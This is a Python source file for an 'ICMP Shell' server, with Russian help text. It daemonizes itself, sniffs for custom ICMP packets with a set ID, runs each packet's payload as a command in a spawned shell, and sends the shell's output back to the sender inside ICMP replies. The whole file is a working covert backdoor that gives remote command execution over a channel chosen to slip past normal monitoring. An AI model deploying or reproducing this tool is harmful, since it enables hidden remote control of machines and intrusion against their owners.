import argparse
import subprocess
import sys
import threading

from daemoniker import Daemonizer
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.packet import bind_layers
from scapy.sendrecv import sniff, sendp

import config
import opening_terminal
from CustomICMP import CustomICMP
from chksum_calculation import calc_checksum
from opening_terminal import p

destination_mac = "ff:ff:ff:ff:ff:ff"
destination_ip = ""
is_debug = 0


def readstdout():
    global destination_ip, destination_mac
    for l in iter(p.stdout.readline, b""):
        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
        if string == '':
            continue
        config.SEQ = config.SEQ + 1
        packet_bytes = bytes(CustomICMP(seq=config.SEQ, code=config.RESPONSE_CODE, id=config.ID, type=config.TYPE) /
                             string)
        reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
                        CustomICMP(
                            seq=config.SEQ,
                            code=config.RESPONSE_CODE,
                            chksum=calc_checksum(packet_bytes),
                            type=config.TYPE,
                            id=config.ID
                        ) / string)
        sendp(reply_packet, verbose=False)
        sys.stdout.write(string + "\n")


def readstderr():
    global destination_ip, destination_mac
    for l in iter(p.stderr.readline, b""):
        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
        if string == '':
            continue
        config.SEQ = config.SEQ + 1
        packet_bytes = bytes(CustomICMP(seq=config.SEQ, code=config.RESPONSE_CODE, id=config.ID, type=config.TYPE) /
                             string)
        reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
                        CustomICMP(
                            seq=config.SEQ,
                            code=config.RESPONSE_CODE,
                            chksum=calc_checksum(packet_bytes),
                            type=config.TYPE,
                            id=config.ID) / string)
        sendp(reply_packet, verbose=False)
        sys.stderr.write(string + "\n")


def sendcommand(cmd):
    p.stdin.write(cmd.encode() + b"\n")
    p.stdin.flush()


def packet_callback(packet):
    global destination_ip, destination_mac
    if packet.haslayer(CustomICMP):
        if (packet[IP].dst != destination_ip and packet[CustomICMP].code == config.REQUEST_CODE and
                packet[CustomICMP].id == config.ID):
            destination_mac = packet[Ether].src
            destination_ip = packet[IP].src
            received_data = packet[CustomICMP].payload.load.decode('utf-8')
            print("-----+ OUT DATA +-----")
            sendcommand(received_data)


def sniff_in_debug():
    t1 = threading.Thread(target=readstdout)
    t2 = threading.Thread(target=readstderr)

    t1.start()
    t2.start()

    sniff(prn=packet_callback)


with Daemonizer() as (is_setup, daemonizer):
    if is_setup:
        bind_layers(IP, CustomICMP)

        parser = argparse.ArgumentParser(description='ICMP Shell')

        parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
        parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
        parser.add_argument('-t', help='Установка типа ICMP (по умолчанию: 0)')

        args = parser.parse_args()

        if args.i:
            i = int(args.i)
            if i < 0 or i > 65535:
                print("Идентификатор должен быть от 0 до 65535")
                sys.exit()
            config.ID = i
        if args.t:
            config.TYPE = int(args.t)
        if args.d:
            is_debug = 1

        if is_debug:
            sniff_in_debug()

    is_parent, is_debug, destination_mac, destination_ip, config.ID, config.TYPE = daemonizer(
        'icmp-shell.pid',
        is_debug,
        "ff:ff:ff:ff:ff:ff",
        "",
        config.ID,
        config.TYPE
    )

bind_layers(IP, CustomICMP)

p = subprocess.Popen(
    opening_terminal.terminal_name,
    stdout=subprocess.PIPE,
    stdin=subprocess.PIPE,
    stderr=subprocess.PIPE,
    shell=True
)

t1 = threading.Thread(target=readstdout)
t2 = threading.Thread(target=readstderr)

if is_debug == 0:
    t1.start()
    t2.start()

    sniff(prn=packet_callback)
